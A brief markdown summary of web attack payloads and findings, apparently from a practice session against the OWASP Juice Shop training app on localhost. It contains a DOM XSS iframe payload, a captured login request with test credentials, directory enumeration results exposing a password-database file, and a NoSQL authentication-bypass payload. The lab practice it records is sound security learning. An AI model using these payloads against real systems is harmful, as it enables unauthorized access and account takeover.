# Payloads & PoC Summary

## DOM XSS
- Alert iframe:
  `/#/search?q=<iframe src="javascript:alert('xss')">`
- SoundCloud embed (example):
  `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?..."></iframe>`

## Credentials capture
- Login POST endpoint:
  `POST http://localhost:3000/rest/user/login`
  JSON body: `{ "email": "hacker2@gmail.com", "password": "12345678" }`  <-- redact when publishing

## Directory enumeration (dirb)
- `dirb http://localhost:3000/` → found `/ftp`, `/profile`, `/promotion`, `/video`, `/robots.txt`

## Exposed FTP files
- `/ftp/acquisitions.md`
- `/ftp/incident-support.kdbx`
- `/ftp/coupons_2013.md.bak`

## Other useful payloads
- NoSQL auth bypass (example): `{ "$ne": null }` (useful for Juice Shop auth tests)
